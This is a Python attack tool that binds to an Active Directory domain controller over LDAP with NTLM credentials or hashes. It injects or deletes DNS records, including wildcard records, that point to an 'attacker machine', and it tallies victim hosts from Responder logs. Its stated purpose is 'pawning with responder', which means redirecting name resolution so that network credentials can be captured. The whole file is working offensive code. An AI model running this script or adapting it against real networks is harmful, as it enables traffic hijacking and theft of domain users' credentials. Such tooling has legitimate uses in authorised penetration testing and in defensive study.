#!/usr/bin/env python

import sys
import argparse
import getpass
import re
import socket
from impacket.structure import Structure
import ldap3
import dns.resolver
from collections import defaultdict


class DNS_RECORD(Structure):
    """
    dnsRecord - used in LDAP [MS-DNSP] section 2.3.2.2
    impacket based structure, all of the below are tuples in format (fieldName, format)
    """

    structure = (
        ("DataLength", "<H-Data"),
        ("Type", "<H"),
        ("Version", "B=5"),
        ("Rank", "B"),
        ("Flags", "<H=0"),
        ("Serial", "<L"),
        ("TtlSeconds", ">L"),
        ("Reserved", "<L=0"),
        ("TimeStamp", "<L=0"),
        ("Data", ":"),
    )


class DNS_RPC_RECORD_A(Structure):
    """
    DNS_RPC_RECORD_A [MS-DNSP] section 2.2.2.2.4.1
    impacket based structure, all of the below are tuples in format (fieldName, format)
    """

    structure = (("address", ":"),)


class DNS_RPC_RECORD_TS(Structure):
    """
    DNS_RPC_RECORD_TS [MS-DNSP] section 2.2.2.2.4.23
    impacket based structure, all of the below are tuples in format (fieldName, format)
    """

    structure = (("entombedTime", "<Q"),)


def getserial(server, zone):
    dnsresolver = dns.resolver.Resolver()
    try:
        socket.inet_aton(server)
        dnsresolver.nameservers = [server]
    except socket.error:
        pass
    res = dnsresolver.query(zone, "SOA")
    for answer in res:
        return answer.serial + 1


def new_A_record(type, serial):
    nr = DNS_RECORD()
    nr["Type"] = type
    nr["Serial"] = serial
    nr["TtlSeconds"] = 180
    nr["Rank"] = 240
    return nr


ddict1 = defaultdict(list)

parser = argparse.ArgumentParser(
    description="Add/ Remove DNS records for an effective pawning with responder"
)

parser.add_argument(
    "-DNS",
    type=str,
    help="IP address of the DNS server/ Domain Controller to connect to",
)
parser.add_argument(
    "-u", "--user", type=str, help="Domain\\Username for authentication."
)
parser.add_argument(
    "-p",
    "--password",
    type=str,
    help="Password or LM:NTLM hash, will prompt if not specified",
)
parser.add_argument(
    "-a", "--action", type=str, help="ad, rm, or an: add, remove, analyze"
)
parser.add_argument("-r", "--record", type=str, help="DNS record name")
parser.add_argument("-d", "--data", help="The IP address of attacker machine")
parser.add_argument(
    "-l", "--logfile", type=str, help="The log file of Responder in analyze mode"
)


args = parser.parse_args()
# Checking Username and Password
if args.user is not None:
    if not "\\" in args.user:
        print("Username must include a domain, use: Domain\\username")
        sys.exit(1)
    if args.password is None:
        args.password = getpass.getpass()

# Check the required arguments
if args.action in ["ad", "rm"]:
    if args.action == "ad" and not args.record:
        flag = input("No record provided, Enter 'Y' to add a Wildcard record: ")
        if flag.lower() == "y" or flag.lower() == "yes":
            recordname = "*"
        else:
            sys.exit(1)
    else:
        recordname = args.record
    if args.action == "ad" and not args.data:
        print("Provide an IP address with argument -d")
        sys.exit(1)
    if args.action == "rm" and not args.record:
        print("No record provided to be deleted")
elif args.action == "an":
    if args.logfile:
        with open(args.logfile) as infile:
            for lline in infile:
                templist = lline.split(":")
                tempIP = templist[2].split()[0]
                tempRecord = templist[3].split()[0]
                ddict1[tempRecord].append(tempIP)
        infile.close()
        for k, v in ddict1.items():
            print("The request %s was made by %s hosts" % (k, len(set(v))))
        sys.exit(0)
    else:
        print("Provide a log file from responder session in analyze mode")
        sys.exit(1)
else:
    print("Choose one of the three actions")
    sys.exit(1)

# inital connection
dnserver = ldap3.Server(args.DNS, get_info=ldap3.ALL)
print("Connecting to host...")
con = ldap3.Connection(
    dnserver, user=args.user, password=args.password, authentication=ldap3.NTLM
)
print("Binding to host")
# Binding with the user context
if not con.bind():
    print("Bind failed, Check the Username and Password")
    print(con.result)
    sys.exit(1)
print("Bind OK")

# Configure DN for the record, gather domainroot, dnsroot, zone
domainroot = dnserver.info.other["defaultNamingContext"][0]
dnsroot = "CN=MicrosoftDNS,DC=DomainDnsZones,%s" % domainroot
zone = re.sub(",DC=", ".", domainroot[domainroot.find("DC=") :], flags=re.I)[3:]
if recordname.lower().endswith(zone.lower()):
    recordname = recordname[: -(len(zone) + 1)]
record_dn = "DC=%s,DC=%s,%s" % (recordname, zone, dnsroot)

if args.action == "ad":
    record = new_A_record(1, getserial(args.DNS, zone))
    record["Data"] = DNS_RPC_RECORD_A()
    record["Data"] = socket.inet_aton(args.data)

    # Adding the data to record object
    recorddata = {
        #'objectClass': ['top', 'dnsNode'],
        "dNSTombstoned": False,
        "name": recordname,
        "dnsRecord": [record.getData()],
    }
    objectClass = ["top", "dnsNode"]

    print("Adding the record")

    con.add(record_dn, objectClass, recorddata)
    # con.add(record_dn, ['top', 'dnsNode'], recorddata)
    print(con.result)

elif args.action == "rm":
    # searching for the record
    searchbase = "DC=%s,%s" % (zone, dnsroot)
    con.search(
        searchbase,
        "(&(objectClass=dnsNode)(name=%s))"
        % ldap3.utils.conv.escape_filter_chars(recordname),
        attributes=["dnsRecord", "dNSTombstoned", "name"],
    )
    if len(con.response) != 0:
        for entry in con.response:
            if entry["type"] != "searchResEntry":
                print("Provided record does not exists")
                sys.exit(1)
            else:
                record_dn = entry["dn"]
                print(entry["raw_attributes"]["dnsRecord"])
    else:
        print("Provided record does not exists")

    con.delete(record_dn)
    if con.result["description"] == "success":
        print("Record deleted successfully")
